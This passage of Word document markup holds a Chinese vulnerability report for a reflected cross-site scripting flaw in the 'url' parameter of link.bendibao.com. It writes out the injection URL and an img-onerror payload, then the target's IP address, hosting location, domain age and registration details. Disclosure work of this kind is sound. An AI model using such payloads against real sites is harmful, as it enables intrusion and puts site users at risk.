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注入网址:http://link.bendibao.com/linkto.aspx?url="&gt;&lt;img src=x onerror=prompt(1)&gt;http://pages.ctrip.com/commerce/promote/201306/other/tbx/index.html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞参数:url</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>请求方式:GET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>攻击载荷:"&gt;&lt;img src=x onerror=prompt(1)&gt;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获取失败</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>网站主页  http://link.bendibao.com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http://link.bendibao.com</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>IP__坐标  广东省东莞市 电信IDC机房</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>所属__IP  218.16.123.236</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>网站年龄  13年19天（创建于2006年04月28日,过期时间为2020年04月28日)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>备案编号  粤ICP备17055554号-1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深圳市汇深网信息科技有限公司</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>备案时间  2017/5/27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暂无信息</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>页面类型  暂无信息</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ZhongHei"/>
      </w:pPr>
      <w:r>
        <w:t>服务类型  暂无信息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http://link.bendibao.com/linkto.aspx?url="&gt;&lt;img src=x onerror=prompt(1)&gt;http://pages.ctrip.com/commerce/promote/201306/other/tbx/index.html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k.bendibao.co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